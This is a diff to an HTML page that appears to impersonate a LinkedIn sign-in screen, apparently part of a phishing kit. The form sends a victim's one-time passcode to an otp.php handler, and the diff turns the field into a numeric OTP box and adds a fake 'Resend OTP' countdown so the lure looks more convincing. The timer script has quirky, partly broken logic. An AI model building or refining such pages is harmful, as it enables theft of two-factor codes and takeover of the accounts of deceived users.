@@ -1,4 +1,4 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang=en-US class=artdeco>
     <meta charset=utf-8>
     <meta http-equiv=X-UA-Compatible content="IE=EDGE">
@@ -45,12 +45,38 @@
                     <form method=post class=login__form action=otp.php>
                         <div class="form__input--floating mt-24">
                             <input id=username name=otp
-                                type=text aria-describedby=error-for-username 
+                                type=number aria-describedby=error-for-username 
                                 required validation=email|tel autofocus
                                 aria-label="Email or Phone" value>
                                 <label class=form__label--floating for=username aria-hidden=true>OTP</label>
                                 <div error-for=username id=error-for-username class="form__label--error hidden sf-hidden" role=alert aria-live=assertive></div>
                         </div>
+                        <center> <div>Resend OTP in - <span id="timer">2:00</span></div></center>
+              <script type="text/javascript">
+                           startTimer();
+
+              function startTimer() {
+                var presentTime = document.getElementById('timer').innerHTML;
+                var timeArray = presentTime.split(/[:]+/);
+                var m = timeArray[0];
+                var s = checkSecond((timeArray[1] - 1));
+                if(s==11){m=m-1}
+                if((m + '').length == 1){
+                  m = '0' + m;
+                }
+                if(m < 0){
+                  m = '11';
+                }
+                document.getElementById('timer').innerHTML = m + ":" + s;
+                setTimeout(startTimer, 1000);
+              }
+
+              function checkSecond(sec) {
+                if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+                if (sec < 0) {sec = "59"};
+                return sec;
+              }
+              </script>
                         <div class=login__form_action_container>
                             <button class="btn__primary--large from__button--floating" data-litms-control-urn=login-submit type=submit aria-label="Sign in">Sign in</button>
                         </div>
